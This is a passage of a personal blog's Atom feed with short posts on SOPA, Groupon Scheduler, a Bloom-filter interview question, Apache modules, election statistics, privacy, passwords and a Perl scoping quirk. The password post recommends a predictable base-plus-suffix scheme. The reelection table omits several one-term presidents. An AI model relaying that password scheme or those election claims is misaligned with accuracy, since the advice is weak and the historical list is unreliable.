<p>In the meantime, there are <a href="http://www.scribd.com/doc/76607770/Updated-SOPA-Supporters">many companies</a> that support SOPA that the online community is not rallying against, including the majority of television networks (ABC, CBS, Disney, ESPN, Time Warner), and yet we still continue to watch tv. Our expectations for media companies are different than web companies, but do they have to be?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>GroupOn Scheduler</title>
   <link href="http://dangoldin.com/2011/12/08/groupon-scheduler/"/>
   <updated>2011-12-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2011/12/08/groupon-scheduler</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/groupon-scheduler.png" layout="responsive" width="616" height="358"/>

<p>I'm not surprised that someone came out with an <a href="http://www.groupon.com/scheduler" title="GroupOn Scheduler">online scheduling tool</a> for SMBs. I am a bit surprised that it was GroupOn though. I suspect many smaller companies have tried doing it but found selling to the SMB much more difficult than they expected. Since GroupOn already has penetration in the SMB space they may find it a lot easier, especially if, as it looks, they will be offering it free to any business that runs a GroupOn promotion.</p>

<p>This brings a good amount of value to the business:</p>

<ul class="bulleted">
  <li>Cheaper appointment booking system<br />since fewer people will use the phone</li>
  <li>Reminding customers about upcoming appointments</li>
</ul>

<p>The real value is going to GroupOn though:</p>

<ul class="bulleted">
  <li>GroupOn can see how busy the businesses are (not just from GroupOns)</li>
  <li>GroupOn can start offering a finer capacity management product - Imagine being able to see a haircut for $10 if you go in the next hour but $20 if you book it for tomorrow.</li>
  <li>GroupOn will have major visibility into the way businesses operate and will be able to relate it back to the customer</li>
</ul>

<p>I'll be watching this to see how it turns out but I'm glad to see this space innovating. As businesses get more comfortable running their business online it will become much easier for new companies to attack this space.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tech Interview Question</title>
   <link href="http://dangoldin.com/2011/01/08/fun-developer-interview-question/"/>
   <updated>2011-01-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2011/01/08/fun-developer-interview-question</id>
   <content:encoded><![CDATA[
<p>When conducting interviews, I’ve developed the following criteria for a good interview problem:</p>

<ul class="bulleted">
	<li>Avoid brain teasers - they tend to be hit/miss and some people don't really do well under this type of problem</li>
	<li>Challenging - the answer should not be immediately obvious and the should require some creativity</li>
	<li>Rare - similar to above, the problem should not be a common question in order to get</li>
	<li>Flexible - the problem has multiple solutions and can be modified on the fly for different skill levels</li>
</ul>

<p>I’ve found that the following problem satisfies the criteria and gives a pretty good sense of a developer’s skill level.</p>

<p>The problem starts of as a simple scenario:</p>
<blockquote>You need to write a program that will accept a list of words. After the words are entered, the user will enter words and your program will need to indicate whether the entered word was in the original list. How would you design this program and what data structures would you use?</blockquote>
<p>The typical answer to this question is to either store the initial word list in an array, a tree, or a hash. If it’s an array or a tree, we talk about the Big O of the solutions and compare that to just using a hash. At this point you can get a sense of whether the person you’re interviewing understands basic data structures and knows the use cases of each one.</p>

<p>To dig deeper, I add a twist:</p>
<blockquote>Now imagine you were transported back in time and it turns out your program uses too much memory and you can't keep track of every word. Do you have any alternative solutions?</blockquote>
<p>The creative solutions start appearing here and you can get a pretty good sense of the problem solving skills. For example, a proposed solution at this point is to use word roots or repetitive letter combinations in a tree like structure to reduce the memory usage. We then talk about the algorithm that would need to be written and try to point out possible problems and see how they would be addressed.</p>

<p>And a final twist:</p>
<blockquote>Let's say you still do not have enough memory and but you find out that you don't need to be correct all the time. Can you think of any solutions that can achieve this?</blockquote>
<p>At this point, many people will try to come up with a heuristic or machine learning technique to try to identify words that resemble the words previously entered. We can then talk about both how to construct the algorithm as well as talk about the accuracy of the approach. It turns out that for these solutions it’s difficult to quantify the trade off between error rate and space requirements.</p>

<p><img title="Example of a Bloom filter" src="http://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Bloom_filter.svg/300px-Bloom_filter.svg.png" alt="Example of a Bloom filter" width="300" height="108" /></p>

<p>At this point the concept of a Bloom Filter is brought up, either by me or by the person I’m talking to. If it’s by me I go through the basic concepts (bit array, hash functions, probabilistic data structures) and can get a good sense of whether this is understood or I need to dig deeper. It’s great when you can see the moment that someone “gets” the value of this data structure and knows immediately how to use it. At this point we discuss the trade off between the size of the bit array and the number of hash functions. If there’s time, we’ll work on deriving the relationship between the two as well as talk about where they can be used in the real world.</p>

<p>I wish I could remember how I came up with this problem - I think it stemmed from me encountering Bloom Filters for the first time as well as reading a few articles about spell checking and dictionaries.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google Giving Employees Free Adwords?</title>
   <link href="http://dangoldin.com/2010/08/25/google-giving-employees-free-adwords/"/>
   <updated>2010-08-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2010/08/25/google-giving-employees-free-adwords</id>
   <content:encoded><![CDATA[<p>According to this <a href="http://agtb.wordpress.com/2010/01/06/my-1day-adwords-account/">blog post</a> <a class="zem_slink" title="Google" rel="homepage" href="http://google.com">Google</a> gives their emplo﻿yees $1 a day to advertise on Google. The intent is to give employees the perspective of an Adwords user in order to improve the product. In addition to giving employees exposure to Adwords, this also has potential to increase the competition in <a class="zem_slink" title="AdWords" rel="wikipedia" href="http://en.wikipedia.org/wiki/AdWords">Adword</a> auctions by causing bids to increase and leading to more revenue  for Google. Given that Google has more than 10,000 employees worldwide this can have an effect on smaller advertisers.</p>

<p><img title="Image representing Google as depicted in Crunc..." src="http://www.crunchbase.com/assets/images/resized/0002/9578/29578v7-max-450x450.jpg" alt="Image representing Google as depicted in Crunc..." width="250" height="99" /></p>

<p>Other people have written about Google advertising for their own products and giving employees free money can have a similar, although smaller, effect.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>More posts coming soon</title>
   <link href="http://dangoldin.com/2010/03/10/more-posts-coming-soon/"/>
   <updated>2010-03-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2010/03/10/more-posts-coming-soon</id>
   <content:encoded><![CDATA[<p>I will try a new policy - at least one post a week. Harass me if I’m not doing it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Improving your luck</title>
   <link href="http://dangoldin.com/2009/09/28/improving-your-luck/"/>
   <updated>2009-09-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2009/09/28/improving-your-luck</id>
   <content:encoded><![CDATA[<div class="right10">
  <img title="Seneca, part of double-herm in Antikensammlung..." src="http://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Seneca-berlinantikensammlung-1.jpg/300px-Seneca-berlinantikensammlung-1.jpg" alt="Seneca, part of double-herm in Antikensammlung..." width="300" height="370"/>
</div>

<p>People often blame bad luck for their failures. This absolves them of responsibility and allows them to stop trying. What they should have done is admitted their failure, learned from the experience, and prepared themselves for the next opportunity. Exposing yourself to opportunities is the best way to overcome bad luck. Authors are a great example of this: <a title="J. K. Rowling" rel="homepage" href="http://www.jkrowling.com">J K Rowling</a> and <a title="John Grisham" rel="imdb" href="http://www.imdb.com/name/nm0001300/">John Grisham</a> had their novels rejected numerous times before they succeeded. Yet soon after publishing they became blockbusters. How many authors gave up when trying to have their work published? Imagine if they had the determination that J K Rowling and John Grisham had.</p>

<p>As <a title="Seneca the Younger" rel="wikipedia" href="http://en.wikipedia.org/wiki/Seneca_the_Younger">Seneca the Younger</a>, a Roman philosopher, said, “Luck is what happens when preparation meets opportunity.” In order to increase your luck you need to increase your exposure to different opportunities. In addition, you need to realize an opportunity when it presents itself. A way to view this is through the simple roll of a die. Although a die only has a 1 in 6 chance of rolling a 1 when rolled once, it has a greater chance of landing on a 1 when rolled multiple times. Most people give up after a few rolls but in order to succeed you need to keep on playing the game until you get a successful roll.</p>

<p>The fact that you are reading this shows that you are luckier than the majority of the world’s population. You have access to the internet and the desire to improve your luck. You can leverage that to contact leaders in your field or people who can help you succeed. You may get no responses from some but you will get encouraging responses from others. You just need to be open and increase your opportunities.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Power of Twitter</title>
   <link href="http://dangoldin.com/2009/03/08/power-of-twitter/"/>
   <updated>2009-03-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2009/03/08/power-of-twitter</id>
   <content:encoded><![CDATA[<p><img title="Image representing Twitter as depicted in Crun..." src="http://www.crunchbase.com/assets/images/resized/0000/2755/2755v2-max-450x450.png" alt="Image representing Twitter as depicted in Crun..." width="210" height="49" /></p>

<p>I may be a bit late to the party but I was finally able to see the power of <a title="Twitter" rel="homepage" href="http://twitter.com" target="_blank">Twitter</a> this afternoon.</p>

<p>I kept on getting an "Authentication failed" message when trying to log in to AIM. A few years ago I would not know what to do except ask my friends if they were having any trouble. Right now, I went to searched for "AIM" on Twitter and discovered that other people were having the same problem. Turns out it was a systematic problem and I wasn't the only one affected. Being able to know more about this problem is a great benefit. There has been a lot of talk of the power of real time search and real time news but this was my first real glimpse into the power of Twitter.</p>

<p>My first action wasn't to search for "AIM log in problem" on Google but to search for "AIM" on Twitter. It's amazing to me that Twitter was able to replace a certain type of search. The majority of my searches will still be done on Google but it seems that for anything with a pulse - Twitter search is the way to go.</p>

<p>Twitter's character limit is a great way to take advantage of the network effect. Having a low character limit encourages a lot more users to tweet thereby making Twitter feel alive and giving everyone else more information.</p>

<p>There have been numerous ideas of Twitter being used for market research and to get an early customer response - I can imagine that happening now and it's mind blowing.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Enabling modules in Apache2 under Ubuntu</title>
   <link href="http://dangoldin.com/2009/01/23/enabling-modules-in-apache-2-under-ubuntu/"/>
   <updated>2009-01-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2009/01/23/enabling-modules-in-apache-2-under-ubuntu</id>
   <content:encoded><![CDATA[<p>The Apache enabled modules are found in <span class="gray">"/etc/apache2/mods-enabled"</span> as a set of .load and .conf files. If the modules you want are in the <span class="gray">/etc/apache2/mods-available</span> folder but not in <span class="gray">"/etc/apache2/mods-enabled"</span> folder, just copy the .load and .conf files over (note that the .conf file may not exist).</p>

<p>If there is no file in the mods-availble folder, you will need to create a new .load file in the mods-available folder to point to a module in <span class="gray">"/usr/lib/apache2/modules"</span>. To do this, create a .load file containing the line <span class="gray">"LoadModule xxx /usr/lib/apache2/modules/yyy.so"</span> where xxx is the name of the module and yyy is the file name. After creating this file, you can just copy it over to the mods-enabled folder and restart apache using <span class="gray">"sudo /etc/init.d/apache2 restart"</span>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>What's the easiest way to be elected president?</title>
   <link href="http://dangoldin.com/2009/01/21/whats-the-easiest-way-to-be-elected-president/"/>
   <updated>2009-01-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2009/01/21/whats-the-easiest-way-to-be-elected-president</id>
   <content:encoded><![CDATA[<p>Answer: Be elected for a first term, the second term will follow.</p>

<p>It turns out it’s pretty likely that a president will be elected to a second term. If we examine all previous Presidential Elections, we will see 8 presidents who failed to get reelected:</p>

<table class="table">
<thead>
<tr>
    <th>President</th>
    <th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>Benjamin Harrison</td>
<td>Failed to get reelected in 1892</td>
</tr>
<tr>
<td>George H. W. Bush</td>
<td>Failed to get reelected in 1992</td>
</tr>
<tr>
<td>Herbert Hoover</td>
<td>Failed to get reelected in 1932</td>
</tr>
<tr>
<td>Jimmy Carter</td>
<td>Failed to get reelected in 1980</td>
</tr>
<tr>
<td>John Quincy Adams</td>
<td>Failed to get reelected in 1828</td>
</tr>
<tr>
<td>Theodore Roosevelt</td>
<td>Failed to get reelected in 1912</td>
</tr>
<tr>
<td>William Henry Harrison</td>
<td>Failed to get elected in 1836</td>
</tr>
<tr>
<td>William Howard Taft</td>
<td>Failed to get reelected in 1912</td>
</tr>
</tbody></table>

<p>On the other hand, if we look at all presidents with 2 or more terms, we only see a few Presidents who have failed to get elected. Some of these, like Andrew Jackson, failed to get elected initially but were then able to get 2 terms in office. Grover Cleveland had non consecutive terms in office. In total, there were 16 presidents who had a second term.</p>

<table class="table">
<thead>
<tr>
<th align="left" height="19" width="143">President</th>
<th align="left" width="367">Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>Abraham Lincoln</td>
<td></td>
</tr>
<tr>
<td>Andrew Jackson</td>
<td>Failed to get elected in 1824, was elected in 1828 and 1832</td>
</tr>
<tr>
<td>Bill Clinton</td>
<td></td>
</tr>
<tr>
<td>Dwight D. Eisenhower</td>
<td></td>
</tr>
<tr>
<td>Franklin D. Roosevelt</td>
<td></td>
</tr>
<tr>
<td>George W. Bush</td>
<td></td>
</tr>
<tr>
<td>George Washington</td>
<td></td>
</tr>
<tr>
<td>Grover Cleveland</td>
<td>Failed to get reelected in 1888 (was pres in 1884 and 1892)</td>
</tr>
<tr>
<td>James Madison</td>
<td></td>
</tr>
<tr>
<td>James Monroe</td>
<td>Failed to get elected in 1808, was elected in 1816 and 1820</td>
</tr>
<tr>
<td>Richard Nixon</td>
<td>Failed to get elected in 1960</td>
</tr>
<tr>
<td>Ronald Reagan</td>
<td></td>
</tr>
<tr>
<td>Thomas Jefferson</td>
<td>Failed to get elected in 1796</td>
</tr>
<tr>
<td>Ulysses S. Grant</td>
<td></td>
</tr>
<tr>
<td>William McKinley</td>
<td></td>
</tr>
<tr>
<td>Woodrow Wilson</td>
<td></td>
</tr>
</tbody></table>

<p>Franklin Delano Roosevelt ran for, and won, a 3rd term in 1940 using the idea that one should "not change horses in midstream." He did not need to do that since it seems people stick with what they are comfortable with.</p>

<p>Note: If I made a mistake anywhere let me know so I can correct it. The data was retrieved from Wikipedia.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>More posts coming up</title>
   <link href="http://dangoldin.com/2009/01/20/more-posts-coming-up/"/>
   <updated>2009-01-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2009/01/20/more-posts-coming-up</id>
   <content:encoded><![CDATA[<p>I’ve been busy recently but have a bunch of topics that I want to write about so keep on checking.</p>

<p>Thanks for reading!</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On weekend voting</title>
   <link href="http://dangoldin.com/2008/10/24/weekend-voting/"/>
   <updated>2008-10-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/10/24/weekend-voting</id>
   <content:encoded><![CDATA[<p>I found an <a href="http://www.nytimes.com/2008/10/24/opinion/24ornstein.html?ref=opinion">op-ed</a> in the NY Times that claimed that the best way to increase voter turnout was by having election day fall on a weekend. They provide a few examples but nothing too detailed. I tried pulling in some data and seeing if I could come to the same conclusion. I used two data sets: <a href="http://en.wikipedia.org/wiki/Voter_turnout ">voter turn out by country</a> and <a href="http://www.electionguide.org/calendar.php ">election dates by country</a>.</p>

<p>Combining this data into one table, and ignoring the missing data:</p>

<table class="table">
<thead>
<tr>
<th>Country</th>
<th>Election Type</th>
<th>Date</th>
<th>Day of week</th>
<th>Weekend</th>
<th>Turnout</th>
</tr>
</thead>
<tbody>
<tr>
<td>Czech Republic</td>
<td>Presidential Final</td>
<td>Fri 2/15/08</td>
<td>6</td>
<td>No</td>
<td>85%</td>
</tr>
<tr>
<td>South Korea</td>
<td>Parliamentary<span> </span></td>
<td>Wed 4/9/08</td>
<td>4</td>
<td>No</td>
<td>75%</td>
</tr>
<tr>
<td>Canada</td>
<td>Parliamentary<span> </span></td>
<td>Tue 10/14/08</td>
<td>3</td>
<td>No</td>
<td>76%</td>
</tr>
<tr>
<td>Czech Republic</td>
<td>Parliamentary<span> </span></td>
<td>Fri 10/17/08</td>
<td>6</td>
<td>No</td>
<td>85%</td>
</tr>
<tr>
<td>United States</td>
<td>Presidential<span> </span></td>
<td>Tue 11/4/08</td>
<td>3</td>
<td>No</td>
<td>54%</td>
</tr>
<tr>
<td>Romania</td>
<td>Parliamentary<span> </span></td>
<td>Fri 11/28/08</td>
<td>6</td>
<td>No</td>
<td>81%</td>
</tr>
<tr>
<td>Russia</td>
<td>Presidential<span> </span></td>
<td>Sun 3/2/08</td>
<td>1</td>
<td>Yes</td>
<td>61%</td>
</tr>
<tr>
<td>Malta</td>
<td>Parliamentary<span> </span></td>
<td>Sat 3/8/08</td>
<td>7</td>
<td>Yes</td>
<td>94%</td>
</tr>
<tr>
<td>Spain</td>
<td>Parliamentary<span> </span></td>
<td>Sun 3/9/08</td>
<td>1</td>
<td>Yes</td>
<td>73%</td>
</tr>
<tr>
<td>Italy</td>
<td>Parliamentary<span> </span></td>
<td>Sun 4/13/08</td>
<td>1</td>
<td>Yes</td>
<td>90%</td>
</tr>
<tr>
<td>Iceland</td>
<td>Presidential (Cancelled)<span> </span></td>
<td>Sat 6/28/08</td>
<td>7</td>
<td>Yes</td>
<td>89%</td>
</tr>
<tr>
<td>Austria</td>
<td>Parliamentary<span> </span></td>
<td>Sun 9/28/08</td>
<td>1</td>
<td>Yes</td>
<td>92%</td>
</tr>
<tr>
<td>New Zealand</td>
<td>Parliamentary<span> </span></td>
<td>Sat 11/8/08</td>
<td>7</td>
<td>Yes</td>
<td>88%</td>
</tr>
</tbody></table>

<p>It does seem as if they are on to something - the average turnout for weekday election days was 76% while the average turnout for weekend election days was 84%. This wasn't a very rigorous examination and I am sure there are many more issues that factor in to the voting process but it does make intuitive sense.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some thoughts on innovation</title>
   <link href="http://dangoldin.com/2008/10/01/some-thoughts-on-innovation/"/>
   <updated>2008-10-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/10/01/some-thoughts-on-innovation</id>
   <content:encoded><![CDATA[<p>I stumbled unto an <a href="http://blog.modernmechanix.com/2008/03/24/what-will-life-be-like-in-the-year-2008/" target="_blank">article</a> written in 1968 that tries to predict what the world of 2008 will be like. Usually, these types of predictions are completely off and tend to predict a future far more advanced than what it actually becomes.<div class="zemanta-img zemanta-action-dragged">
<a href="http://commons.wikipedia.org/wiki/Image:Benz-velo.jpg"><img title="1895 Benz Velo. Along with its contemporary Duryea Motor Wagon, considered the earliest standardized cars. The decade marking further developments in the history of the automobile." src="http://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/Benz-velo.jpg/202px-Benz-velo.jpg" alt="1895 Benz Velo. Along with its contemporary Duryea Motor Wagon, considered the earliest standardized cars. The decade marking further developments in the history of the automobile." width="202" height="162" /></a>
</div></p>

<p>As expected, the article had it's exaggerations (automatic cars driving at 250 miles per hour, inter-continental rockets, average work day of 4 hours ) but what struck me the most is how accurate the predictions about computers are:</p>

<blockquote>The single most important item in 2008 households is the computer. These electronic brains govern everything from meal preparation and waking up the household to assembling shopping lists and keeping track of the bank balance. Sensors in kitchen appliances, climatizing units, communicators, power supply and other household utilities warn the computer when the item is likely to fail. A repairman will show up even before any obvious breakdown occurs.

Computers also handle travel reservations, relay telephone messages, keep track of birthdays and anniversaries, compute taxes and even figure the monthly bills for electricity, water, telephone and other utilities. Not every family has its private computer. Many families reserve time on a city or regional computer to serve their needs. The machine tallies up its own services and submits a bill, just as it does with other utilities.

Money has all but disappeared. Employers deposit salary checks directly into their employees’ accounts. Credit cards are used for paying all bills. Each time you buy something, the card’s number is fed into the store’s computer station. A master computer then deducts the charge from your bank balance.

Computers not only keep track of money, they make spending it easier. TV-telephone shopping is common. To shop, you simply press the numbered code of a giant shopping center. You press another combination to zero in on the department and the merchandise in which you are interested. When you see what you want, you press a number that signifies “buy,” and the household computer takes over, places the order, notifies the store of the home address and subtracts the purchase price from your bank balance. Much of the family shopping is done this way. Instead of being jostled by crowds, shoppers electronically browse through the merchandise of any number of stores.</blockquote>

<p>Compared to the rest of the predictions, this is amazingly close to what we currently have. There is still some emphasis on the server and treating computers as a utility that is not currently present but with the rise of Google Docs and other online tools, that is not such a distant notion.</p>

<p>This begs the question, why are the predictions so close when it comes to computers but so off when it comes to other technologies? More importantly, why does <a title="Moore's Law" href="http://en.wikipedia.org/wiki/Moore%27s_law.">Moore's Law</a> apply to transistors but not to larger technologies? I have a few ideas:</p>

<ul class="bulleted">
	<li>Infrastructure costs - it's cheaper to replace modern day computers than modern day cars. Thus, innovation can happen at a faster pace as people replace their computers. Also, computers tend to work in a much more solitary environment than cars do; being able to drive a car 300 miles per hour is useless when the roads can't take it and the laws prevent it.</li>
	<li>Experimentation - it's easier for the average person to hack around on a computer than it is to hack around on a car. Thus, a lot more people are working on ideas and due to sheer numbers, more ideas are bound to stick.</li>
	<li>Brand new technologies breed creativity - When computers were invented, no one knew what they were capable of and everyone had ideas as to how they could be used. Many people pursued their ideas and were able to create and improve on various technologies. Also, many teenagers and students were involved in embracing this new technology - and they didn't know what was impossible so they reached for the stars.Now, everyone is so used to what cars are that people don't even imagine what cars could be capable of. We may be approaching this same plateau with computers.</li>
</ul>

<p>I'll try to update these when I think of any more.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Should we apply the EU model to the US</title>
   <link href="http://dangoldin.com/2008/09/15/should-we-apply-the-eu-model-to-the-us/"/>
   <updated>2008-09-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/09/15/should-we-apply-the-eu-model-to-the-us</id>
   <content:encoded><![CDATA[<p>I've recently been thinking about whether the US can move to a EU like model with each state having control over it's own policies but sharing a <a title="Single market" rel="wikipedia" href="http://en.wikipedia.org/wiki/Single_market" target="_blank">single market</a> and monetary union. In addition, competition is well regulated and a shared budget exists. In addition, it looks as if this shared budget is a little over 1% of the <a title="Gross National Income" rel="wikipedia" href="http://en.wikipedia.org/wiki/Gross_National_Income" target="_blank">Gross National Income</a> of the individual countries (1) - imagine a Federal tax rate of 1%.</p>

<p>Clearly, the states would then have to handle more of the lower level administration but that may be for the best. Each state is different and must be governed differently. States with a large agricultural focus should have different policies than states with a large technology focus. States with a highly religious population should have different policies than the more atheist states. Under such a system, some states may end up doing better than others in the short term but if it becomes obvious that certain policies work, the other states would have adapt in order to compete, thus improving the US as a whole.</p>

<p>I believe that such a system plays on the strengths of the federal government as well as the strengths of local governments. It will still be easy to travel from state to state, use the same currency, and not deal with trade barriers but each state will have it's own social and cultural policies that reflect its population.</p>

<p>It just seems that the federal government cannot pass laws that will be beneficial to all states at once and so there is some form of a standstill. Maybe this focus on a more state-centered model is the approach to take.</p>

<p>In the future, I would like to take a look at the economic growth of the individual countries before the creation of the EU as well as after the creation of the EU adjusted for the overall growth of the world markets. I have a feeling it would show that the creation of the EU encouraged the growth of the individual markets.</p>

<p>Notes:
(1) <a href="http://en.wikipedia.org/wiki/European_Union#Budget">http://en.wikipedia.org/wiki/European_Union#Budget</a>
</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Voting system proposal</title>
   <link href="http://dangoldin.com/2008/09/12/voting-system-proposal/"/>
   <updated>2008-09-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/09/12/voting-system-proposal</id>
   <content:encoded><![CDATA[<p>It seems that there is a recent emphasis on "character" in the election. Unfortunately, character can be faked with some acting and campaign management. To understand how the candidates will perform in office we need to look at their past accomplishments and failures. Public records show the <a href="http://www.senate.gov/pagelayout/legislative/a_three_sections_with_teasers/votes.htm" target="_blank">vote history</a> for the candidates and all it takes is a little bit of research to see how the candidates have voted.</p>

<p>But people aren't interested in looking at data; they are more interested in how much candidates spend on their haircut or who looks more "confident." I imagine that before radio or television existed and the only news source was the newspaper, candidates would have stood on their issues alone. The vast majority of the population would not have seen the candidates in person and would have to have focused on the issues each candidate presented. Maybe it's time we go back to those days with a ballot only containing issues.</p>

<p>In addition, why not throw in an intelligence test geared towards the issues and use the score to weigh the vote. If companies can use intelligence in their hiring decisions, why can't the government use it in the voting process? The impact of a wrong decision is much greater.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On TV commercials</title>
   <link href="http://dangoldin.com/2008/09/03/tv-commercials/"/>
   <updated>2008-09-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/09/03/tv-commercials</id>
   <content:encoded><![CDATA[<p>It may be my memory but it seems that TV commericals have been getting longer and longer as compared to a decade ago. It would be very interesting to see a plot of the length of the average commercial break over the past few decades - I think we'll see that the length of the average commercial break has drastically increased.</p>

<p>In addition, it seems as if there are no commerical breaks between consecutive TV shows anymore. Clearly this is a way to keep us from turning off the TV and doing something productive with our lives.</p>

<p>Does anyone have any thoughts?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Advice on internet passwords</title>
   <link href="http://dangoldin.com/2008/06/19/internet-passwords-some-advice/"/>
   <updated>2008-06-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/06/19/internet-passwords-some-advice</id>
   <content:encoded><![CDATA[<p>After my previous post on the lack of privacy, I feel obligated to give some advice regarding internet passwords in order to maintain the privacy that we do have.</p>

<ol>
    <li>Have at least 3 different passwords:
    <ol>
    	<li>E-mail Account</li>
        This account controls all your other accounts so protect it as much as you can. All other accounts can be accessed or reset if someone has access to your email.
    	<li>Bank/Financial Accounts</li>
        These control your money so use a different password for these than for the rest of your accounts. In addition, you may want to keep your credit card account passwords separate from your bank accounts.
    	<li>"Fun" Account</li>
        These may not be vital to your survival (unless you are a facebook addict) so a password compromise here may not affect you too much. In addition, these sites may not store your password as securely as the bank accounts so you don't want this password being the same as the other accounts.
    </ol>
    <p>A good way to generate passwords is to contain some sort of "base" and add some prefixes or suffixes to it in order to come up with the password for the various sites. For example, I can have my base password be "orange". For financial sites my password will be "orangeFIN22", for my email it will be "orangeE33", etc. Then you don't have to remember an entirely different set of passwords yet they are distinct enough to avoid compromising all your accounts with a stolen password.</p>
    </li>

    <li>Don't trust web sites that are able to send you your password over email

    <p>If a website is able to tell you what your password is, it means it is storing it in the database as either the password itself or through a transformation that is reversible (a becomes b, b becomes c, ..). This means that the site knows what your password is and can be easily accessed by employees of the site or anyone that has access to the database.</p>

    <p>The proper way to handle user passwords is to hash it (one way map) immediately to some obfuscated characters and store those in the database along with an additional field that ensures each row is hashed differently. Then when a user logs in, the site will do this one way map and compare the result against the value in the database; omly if they match is the user logged in.</p>
    </li>
</ol>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Privacy in the digital age</title>
   <link href="http://dangoldin.com/2008/06/12/privacy-in-the-digital-age/"/>
   <updated>2008-06-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/06/12/privacy-in-the-digital-age</id>
   <content:encoded><![CDATA[<p>With so many people joining social networks like Facebook, MySpace, and LinkedIn, it's becoming harder and harder to protect your personal information. If one of your friends happens to add a host of different facebook apps, those apps will have access to his friends' (your) information. There is nothing you can do to stop this unless you either remove all your friends or create very limited profiles.</p>

<p>In addition, people have come to expect to be able to add you as a friend after they've met you and rejecting them may be construed as anti-social. Imagine a recruiter not being able to look at your information on LinkedIn or a potential date not being able to look at your interests or photos on facebook - you will be missing out on opportunities.</p>

<p>How is one supposed to play this game where you want your information both hidden and shared? My solution is to embrace this lack of privacy: integrate yourself into as many social networks as you can, start a blog, post on various forums, publish your photos on Flickr, and so forth. By being famous (if only on the internet) you will eliminate a lot of the adverse effects of having your information public. You will have enough of a community to support you in case anything goes wrong and you can stop worrying about your information being shared.</p>

<p>How often does Bill Gates worry about his identity being stolen?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Interesting Perl behavior</title>
   <link href="http://dangoldin.com/2008/05/30/interesting-perl-behavior/"/>
   <updated>2008-05-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/30/interesting-perl-behavior</id>
   <content:encoded><![CDATA[<p>I ran into this problem a while back and wanted to share it. It was a bit unintuitive but documentd so I guess I shouldn't be surprised by the results. Hopefully this will help someone else avoid this pitfall.</p>

<p>It looks as if declaring a variable with the "my" statement but then guarded with an "if" statement causes the scope of the variable to be global - note that the "use strict 'vars';" pragma does not give an error in this case.</p>

<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="c1">#!/usr/bin/perl -w</span>
<span class="k">use</span> <span class="nv">strict</span>  <span class="p">'</span><span class="s1">vars</span><span class="p">';</span>

<span class="k">sub </span><span class="nf">foo</span><span class="p">{</span>
    <span class="k">my</span> <span class="nv">$val</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">if</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="nv">$val</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">unless</span> <span class="nb">defined</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
    <span class="k">print</span> <span class="p">"</span><span class="s2">Val: </span><span class="si">$val</span><span class="se">\n</span><span class="p">";</span>
    <span class="nv">$val</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">foo</span><span class="p">();</span>
<span class="nv">foo</span><span class="p">();</span></code></pre></figure>

<p>The output of this call gives:<br />
Val: 1<br />
Val: 2</p>

<p>
Although the expected result would seem to be:<br />
Val: 1<br />
Val: 1
</p>

<p>Using Google, I found the following nugget from perlsyn:</p>

<blockquote>NOTE: The behaviour of a my statement modified with a statement modifier conditional or loop construct (e.g. my $x if ... ) is undefined. The value of the my variable may be undef, any previously assigned value, or possibly anything else. Don't rely on it. Future versions of perl might do something different from the version of perl you try it out on. Here be dragons.
<a href="http://perldoc.perl.org/perlsyn.html#Statement-Modifiers" target="_blank">http://perldoc.perl.org/perlsyn.html#Statement-Modifiers</a></blockquote>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Don't judge words by their author</title>
   <link href="http://dangoldin.com/2008/05/28/dont-judge-words-by-their-author/"/>
   <updated>2008-05-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/28/dont-judge-words-by-their-author</id>
   <content:encoded><![CDATA[<p>A common idiom is "Don't judge a book by its cover" but I think that in this modern age this needs to rehashed into "Don't judge words by their author."</p>

